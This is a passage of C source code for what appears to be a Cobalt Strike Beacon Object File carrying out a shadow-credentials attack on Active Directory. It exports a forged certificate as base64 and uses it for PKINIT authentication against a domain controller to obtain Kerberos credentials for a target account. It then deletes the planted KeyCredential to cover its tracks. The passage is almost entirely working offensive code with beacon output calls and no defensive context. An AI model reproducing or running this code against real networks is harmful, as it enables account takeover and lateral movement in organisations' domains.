         DWORD b64Len=0;
         CryptBinaryToStringA(pfx,pfxLen,CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF,NULL,&b64Len);
         char* b64=(char*)malloc(b64Len+1);
         CryptBinaryToStringA(pfx,pfxLen,CRYPT_STRING_BASE64|CRYPT_STRING_NOCRLF,b64,&b64Len);
         BeaconPrintf(CALLBACK_OUTPUT,"[+] Certificate (PFX, base64, no password):"); 
         BeaconPrintf(CALLBACK_OUTPUT,"%s",b64);
         free(b64);
     }
 
     /* Phase 5+6: PKINIT */
     {
         CRYPT_DATA_BLOB pfxBlob = { pfxLen, pfx };
         HCERTSTORE hStore = PFXImportCertStore(&pfxBlob, L"", CRYPT_EXPORTABLE|CRYPT_USER_KEYSET);
         if (!hStore) { BeaconPrintf(CALLBACK_OUTPUT,"[!] PFX import failed"); goto skip_pkinit; }
 
         PCCERT_CONTEXT pCert = CertEnumCertificatesInStore(hStore, NULL);
         if (!pCert) { CertCloseStore(hStore,0); goto skip_pkinit; }
 
         if (szKdc && szKdc[0]) strcpy(kdcBuf, szKdc);
         else sc_kdc_lookup(szDomain, kdcBuf, sizeof(kdcBuf));
 
         char realm[256]={0};
         int ri;
         for (ri=0; szDomain[ri] && ri<255; ri++)
             realm[ri] = (szDomain[ri]>='a'&&szDomain[ri]<='z') ? szDomain[ri]-32 : szDomain[ri];
 
         int reqLen;
         BYTE* req = sc_pkinit_asreq(pCert, szTarget, szDomain, &reqLen);
         if (req) {
             BeaconPrintf(CALLBACK_OUTPUT,"[*] Sending PKINIT AS-REQ (%d bytes) to %s", reqLen, kdcBuf);
             BeaconPrintf(CALLBACK_OUTPUT,"[DBG] req[0..7]:   %02X %02X %02X %02X %02X %02X %02X %02X",req[0],req[1],req[2],req[3],req[4],req[5],req[6],req[7]);
             BeaconPrintf(CALLBACK_OUTPUT,"[DBG] req[8..15]:  %02X %02X %02X %02X %02X %02X %02X %02X",req[8],req[9],req[10],req[11],req[12],req[13],req[14],req[15]);
             BeaconPrintf(CALLBACK_OUTPUT,"[DBG] req[16..23]: %02X %02X %02X %02X %02X %02X %02X %02X",req[16],req[17],req[18],req[19],req[20],req[21],req[22],req[23]);
             int repLen;
             BYTE* rep = sc_kdc_send(kdcBuf, 88, req, reqLen, &repLen);
             if (rep) { sc_asrep_process(rep, repLen, pCert, szTarget, realm, kdcBuf); free(rep); }
             else BeaconPrintf(CALLBACK_OUTPUT,"[!] No AS-REP received");
             free(req);
         } else BeaconPrintf(CALLBACK_OUTPUT,"[!] AS-REQ build failed");
 
         CertFreeCertificateContext(pCert);
         CertCloseStore(hStore,0);
     }
 
 skip_pkinit:
     /* Phase 9: cleanup */
     if (g_keycred_val) {
         if (sc_ldap_delete(szDomain, targetDN))
             BeaconPrintf(CALLBACK_OUTPUT,"[+] KeyCredential removed from msDS-KeyCredentialLink");
         else
             BeaconPrintf(CALLBACK_OUTPUT,"[!] KeyCredential removal failed — clean up manually");
         free(g_keycred_val); g_keycred_val=NULL;
     }
 
 cleanup:
     if (pbSID)  free(pbSID);
     if (pubKey) free(pubKey);
     if (pfx)    free(pfx);
     if (blob)   free(blob);
     CoUninitialize();
 
 #ifndef BOF
     return 0;
 #endif
 }